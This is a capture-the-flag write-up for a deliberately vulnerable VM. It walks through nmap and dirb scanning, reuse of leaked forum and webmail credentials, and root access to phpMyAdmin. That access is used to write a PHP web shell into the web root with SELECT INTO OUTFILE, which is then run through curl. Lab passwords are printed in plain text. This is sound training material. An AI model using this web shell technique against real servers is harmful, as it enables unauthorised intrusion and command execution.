# Writeup1:
# Part1: Find something

![Iso launched](/img/begin_vm.png)

I guess we need to find IP of this Vm, at moment it was the unique way to continue
But with command **ifconfig**, the Vm isn't on network..

## Explore to find, but what ?
- We launched the iso on linux under Virtualbox, firstly we need to create a Host Network Manager to acces its IP
- After set up Network, go to setting about VM `tab:Network` and change `Attached to:`->`NAT`to`Host-only Adapter`
    * Name of your Host Network will be appear below, fine now **ifconfig** works as expected

```c
vboxnet*: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 0a:00:27:00:00:00  txqueuelen 1000  (Ethernet)
        ...
```

- To find IP, use nmap without flag to find it quickly, then launch a new nmap scan with some flags

```cs
└─$ nmap 192.168.56.1/24
...
Nmap scan report for 192.168.56.3
...

└─$ sudo nmap -sV --script=http-enum 192.168.56.3
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 16:40 EDT
Nmap scan report for 192.168.56.3
Host is up (0.00090s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-server-header: Apache/2.2.22 (Ubuntu)
| http-enum: 
|   /forum/: Forum
|   /phpmyadmin/: phpMyAdmin
|   /webmail/src/login.php: squirrelmail version 1.4.22
|_  /webmail/images/sm_logo.png: SquirrelMail
993/tcp open  ssl/imap Dovecot imapd
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds
```
* nmap scan reveals a WebServer Apache/2.2.22
    * 1 route on 80 port
    * 3 routes on 443port (forum, phpmyadmin, webmail)

* And with ***dirb*** it's more interesting !
```cs
└─$ dirb https://192.168.56.3 -R
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.56.3/ ----
+ https://192.168.56.3/cgi-bin/ (CODE:403|SIZE:289)                                           
==> DIRECTORY: https://192.168.56.3/forum/                                                    
==> DIRECTORY: https://192.168.56.3/phpmyadmin/                                               
+ https://192.168.56.3/server-status (CODE:403|SIZE:294)                                      
==> DIRECTORY: https://192.168.56.3/webmail/                                                  

---- Entering directory: https://192.168.56.3/forum/ ----
(?) Do you want to scan this directory (y/n)? y                                                + https://192.168.56.3/forum/backup (CODE:403|SIZE:293)                                       
--> Testing: https://192.168.56.3/forum/backup-db                                             
+ https://192.168.56.3/forum/config (CODE:403|SIZE:293)                                       
==> DIRECTORY: https://192.168.56.3/forum/images/                                             
==> DIRECTORY: https://192.168.56.3/forum/includes/                                           
+ https://192.168.56.3/forum/index (CODE:200|SIZE:4935)                                       
+ https://192.168.56.3/forum/index.php (CODE:200|SIZE:4935)                                   
==> DIRECTORY: https://192.168.56.3/forum/js/                                                 
==> DIRECTORY: https://192.168.56.3/forum/lang/                                               
==> DIRECTORY: https://192.168.56.3/forum/modules/                                            
==> DIRECTORY: https://192.168.56.3/forum/templates_c/                                        
==> DIRECTORY: https://192.168.56.3/forum/themes/                                             
==> DIRECTORY: https://192.168.56.3/forum/update/
...
```

## Root, but not really

* On the *forum*, with 6 users (admin, lmerard, qudevide, thor, wandre and zaz)
* There is post `Probleme login ?` by `lmezard`, and we find this user `!q\]Ej?*5K5cy*AJ`
    * We can connect to the *forum* with this logs
    * And we find its mail *`laurie@borntosec.net `*, now we can try to connect in *webmail* route, that works!

* On *webmail*, there is mail send by `qudevide@mail.borntosec.net` on Subject `DB Access` which contains an access log `root/Fg-'kKXBj87E:aJ$`, probably for the DB(*phpmyadmin*)
    * That works, we are root of the database

* In `forum_db` struct `mlf2_userdata`, we find the all users found earlier, with their password hashed
    * And in `mysql` struct `user`, I guess these are the database admin profiles (Passwords seems to be hashed in SHA1, MySQL4.1/MySQL5)
    * Tried to decrypt them without success..

* Try to make a [reverse](https://en.wikipedia.org/wiki/Shell_shoveling)/[web](https://en.wikipedia.org/wiki/Web_shell) shell

* Let try to inject it, on phpmyadmin in `SQL` tab
```sql
SELECT "<?php system($_GET['cmd'] . '2>&1'); ?>" INTO OUTFILE '/var/www/forum/templates_c/webshell.php'
```
* That works
```bash
└─$ curl --insecure "https://192.168.56.3/forum/templates_c/webshell.php?cmd=pwd"
/var/www/forum/templates_c
```
* Finaly find new log at `/home/LOOKATME/password` -> `lmezard:G!@M6f4Eatau{sF"`, doubtless for ssh or ftp connect log

```bash
└─$ ftp lmezard@192.168.56.3
Connected to 192.168.56.3.
220 Welcome on this server
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

* We have 2 file into the ftp server
```bash
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
```